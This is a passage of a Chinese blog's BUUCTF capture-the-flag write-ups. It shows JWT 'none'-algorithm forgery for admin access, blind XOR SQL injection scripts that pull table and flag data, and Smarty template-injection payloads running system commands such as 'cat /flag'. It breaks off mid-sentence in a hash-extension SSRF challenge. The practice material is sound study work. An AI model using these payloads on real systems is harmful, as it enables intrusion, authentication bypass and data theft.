路径该怎么配置？不管了先填个根目录XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.<span class="title function_">getItem</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="keyword">if</span>(status) &#123;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">register</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    $.<span class="title function_">post</span>(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.<span class="title function_">setItem</span>(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logout</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&#x27;/api/logout&#x27;</span>).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getflag</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&#x27;/api/flag&#x27;</span>).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>(flag);</span><br><span class="line">    &#125;).<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里提示使用了<code>koa</code>来处理静态文件,并且路径直接就是根目录</p><p>可以直接通过 <code>网站根目录/Controllers/api.js</code>访问到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7edb122d-25ac-4584-bee3-90655f589156.node4.buuoj.cn:81/controllers/api.js</span><br></pre></td></tr></table></figure><img src="../images/buuctf-web3/image-20221028145915202.png" alt="image-20221028145915202" style="zoom: 80%;" /><p>这里大概意思就是只要验证了用户名为<code>admin</code>, 就可以返回flag</p><p>那么这里先拿到原来的<code>JWT</code>值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiJhYWEiLCJwYXNzd29yZCI6IjExMSIsImlhdCI6MTY2NjkzOTEzMX0.me3SzN9TLCacXEFk6aqGO9PAw0TkHJOtHRze5hAMIWk</span><br></pre></td></tr></table></figure><p>将值修改后使用<code>python</code>来加密成新的<code>JWT</code>串,这里把加密设置为<code>none</code>,<code>secret_id</code>设置为空值就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iat&quot;</span>: <span class="number">1666939131</span></span><br><span class="line">    &#125;,</span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, key=<span class="string">&quot;&quot;</span></span><br><span class="line">).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line">输出:</span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjExMSIsImlhdCI6MTY2NjkzOTEzMX0.</span><br></pre></td></tr></table></figure><p>然后使用得到的新<code>JWT</code>登录,显示登录成功并返回了新的<code>cookie</code>值</p><p><img src="/../images/buuctf-web3/image-20221028151552718.png" alt="image-20221028151552718"></p><p>将新<code>cookie</code>用于请求<code>flag</code>:</p><p><img src="/../images/buuctf-web3/image-20221028151712357.png" alt="image-20221028151712357"></p><br><hr><br><h1 id="盲注-无列名注入-Ezsqli"><a href="#盲注-无列名注入-Ezsqli" class="headerlink" title="[盲注,无列名注入]Ezsqli"></a>[盲注,无列名注入]Ezsqli</h1><p>先提交点数据试试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id=0   Error Occured When Fetch Result.</span><br><span class="line">id=1   Nu1L</span><br><span class="line">id=2   V&amp;N</span><br><span class="line">id=3   Error Occured When Fetch Result.</span><br><span class="line">id=a   bool(false)</span><br><span class="line">id=1&#x27;  bool(false)</span><br><span class="line">id=2 or 1=1# SQL Injection Checked. 存在过滤,猜测是空格或者or</span><br><span class="line">id=1^(1=1)#  Error Occured When Fetch Result.   这里符合id=0时的结果</span><br><span class="line">id=1^(1=2)#  Nu1L  这里符合id=1时的结果</span><br><span class="line">存在异或注入点</span><br></pre></td></tr></table></figure><p>库名长度:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1^(length(database())=21)#  返回Error Occured When Fetch Result.</span><br></pre></td></tr></table></figure><p>起这么长的名字干啥🤨</p><p>剩下的用脚本搞,上脚本之前先试试其他的过滤词</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id=1^(ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()),1,1))=97)#</span><br><span class="line">被检测到</span><br><span class="line"></span><br><span class="line">把mysql.innodb_table_stats 换成 information_schema仍会被过滤</span><br><span class="line">换成sys.x$schema_table_statistics_with_buffer 不会被过滤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=1^ (substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema= database()),1,1)=&#x27;a&#x27;) #</span><br><span class="line"></span><br><span class="line">表名:users233333333333333,f1ag_1s_h3r3_hhhhh  </span><br></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():</span><br><span class="line">    tables_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1^(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema= database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            &#125;</span><br><span class="line">            res = session.post(base_url, data=data).text</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                tables_name += c</span><br><span class="line">                <span class="built_in">print</span>(tables_name)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里由于<code>information_schema</code>被过滤了,所以接下来还需要进行无列名注入:</p><p>这里学到了一个无列名注入的新姿势:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1^((select 1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回Error Occured When Fetch Result. </span><br><span class="line">id=1^((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回bool(false)</span><br><span class="line">这里说明目标表有两列</span><br></pre></td></tr></table></figure><p>这里前面<code>select</code>的结果,也就是<code>(1,1)</code>会和后面的结果去按位比较(<code>ASCII码</code>)</p><p>如果前后列数不一致,则会报错. 如果列数一致,再判断整个不等式的真假.  </p><p>比较的时候进行按位比较, 假设<code>select * from f1ag_1s_h3r3_hhhhh</code>的结果中,第二列的数据为:<code>flag&#123;aaaaa&#125;</code></p><p>这里传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1^((select 1,&quot;abcd&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure><p>这里将比较”a”和<code>select * from f1ag_1s_h3r3_hhhhh</code>的结果中第一位的<code>ascii</code>码大小</p><p>如果首位比较的结果相等,再接着去比较第二位”b”和后面结果的第二个字符</p><p>根据这种性质,就可以使用代码来注入了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>): <span class="comment"># 测试的ascii码范围</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1^((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))#&quot;</span>.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">            res = session.post(base_url, data=data).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(c-<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> <span class="comment">#输出:FLAG&#123;0F444C84-7580-4A33-B2E8-19FCE4439E7D&#125; </span></span><br></pre></td></tr></table></figure><p>注意这里如果返回了<code>Error Occured When Fetch Result</code>,说明当前比较的字母已经大于flag中对应位置的字母了</p><p>那么它前一个字母是和flag中对应位置相等的,所以12行是<code>flag = flag + chr(c-1)</code></p><p>另外, 上面输出的全都是大写字母的原因是:  <code>mysql</code>中比较是不区分大小写的,所以尽管<code>N</code>的 ascii码小于<code>a</code>,但是在上面判定时还是会判断为<code>N</code>&gt;<code>a</code>  但这不影响我们的结果,只要把上面的flag转为小写就可以了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;FLAG&#123;0F444C84-7580-4A33-B2E8-19FCE4439E7D&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag.lower())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_web部分刷题记录_PART2</title>
      <link href="/post/4f3ccb8a.html"/>
      <url>/post/4f3ccb8a.html</url>
      
        <content type="html"><![CDATA[<h1 id="smarty-SSTI-Web11"><a href="#smarty-SSTI-Web11" class="headerlink" title="[smarty-SSTI]Web11"></a>[smarty-SSTI]Web11</h1><p>要素察觉?<img src="/images/buuctf-web2/image-20221022212305508.png" alt="image-20221022212305508"></p><p>根据网站上的提示,加<code>XFF</code>头,其内容会直接回显在网页上</p><img src="/images/buuctf-web2/image-20221022212644603.png" alt="image-20221022212644603" style="zoom:67%;" /><p>确信是<code>smarty</code>的<code>SSTI</code>了:</p><img src="/images/buuctf-web2/image-20221022212811607.png" alt="image-20221022212811607" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;$smarty.version&#125;   查看smarty版本</span><br><span class="line">3.1.30</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&quot;ls /&quot;)&#125;&#123;/if&#125; 执行系统命令</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web2/image-20221022213108197.png" alt="image-20221022213108197" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&quot;cat /flag&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221022213204740.png" alt="image-20221022213204740"></p><br><hr><br><h1 id="哈希长度扩展攻击-SSRF-Me"><a href="#哈希长度扩展攻击-SSRF-Me" class="headerlink" title="[哈希长度扩展攻击]SSRF Me"></a>[哈希长度扩展攻击]SSRF Me</h1><p>这题给了提示,<code>flag</code>在<code>./flag.txt</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment"># 获得GET中传的参数&quot;param&quot;</span></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从这里开始</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))<span class="comment"># 获得cookie中的参数&quot;action&quot;</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment"># 获得GET中传的参数&quot;param&quot;</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))<span class="comment"># 获得cookie中的参数&quot;sign&quot;</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)): <span class="comment"># 对GET中传的参数&quot;param&quot;进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) <span class="comment"># 创建一个新的对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec()) <span class="comment"># 对param进行扫描,并返回结果</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>sign</code>&#x3D;  系统随机生成的<code>secret_key</code>值 + 用户输入的<code>param</code>(要读取的文件) + <code>action</code>    一起进行md5计算</p><p>直接访问<code>/geneSign</code>,输出了一段<code>sign</code>值:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">591f154875e114faeb2e2388f71e6919</span><br></pre></td></tr></table></figure><p>访问<code>/geneSign</code>,<code>param</code>传<code>flag.txt</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txt</span><br><span class="line">输出:d4bd0b631614327be0367efa305057e5</span><br></pre></td></tr></table></figure><p>访问<code>/De1ta</code>时, 73行创建一个新的<code>task</code>对象,此时 <code>self.sign</code>来自请求<code>/De1ta</code>时 <code>cookie</code>中的值,<strong>这个值需要我们自己抓包添加</strong></p><p>然后<code>checkSign</code>的另一个<code>Sign</code>通过<code>getSign</code>来获得, 通过了检测才能往下进行</p><p>也就是说<code>Cookie</code>中的<code>sign</code>值, 必须等于由<code>secret_key</code> +<code> param</code> + <code>action</code>  计算出来的<code>sign</code>值才行</p><p>那么如果<code>param=flag.txt</code>,那在<code>cookie</code>中添加我们前面访问<code>/geneSign</code>得到的那个值就行,然后<code>cookie</code>中的<code>action</code>传<code>scan</code></p><p>可利用点应该在82行<code>return urllib.urlopen(param).read()[:50]</code>,添加上面的参数并访问<code>/De1ta</code>时,服务器通过检测就会去读取<code>param</code>的内容</p><p><img src="/images/buuctf-web2/image-20221023101155575.png" alt="image-20221023101155575"></p><p>读取成功,但现在问题是如何将<code>action</code>改为<code>read</code>来获得读取结果</p><p>(61行<code>action</code>的值是固定为<code>scan</code>的,所以我们访问<code>/geneSign</code>无法获得<code>action=read</code>时的<code>sign</code>值)</p><p>注意到代码中对执行<code>scan</code>还是<code>read</code>进行检测时,用的是 <code>if xx in action</code> 不是严格地去查询<code>action</code>的值是否等于某一项</p><p>那么如果访问<code>/De1ta</code>时将<code>action</code>设置为: <code>scanread</code> 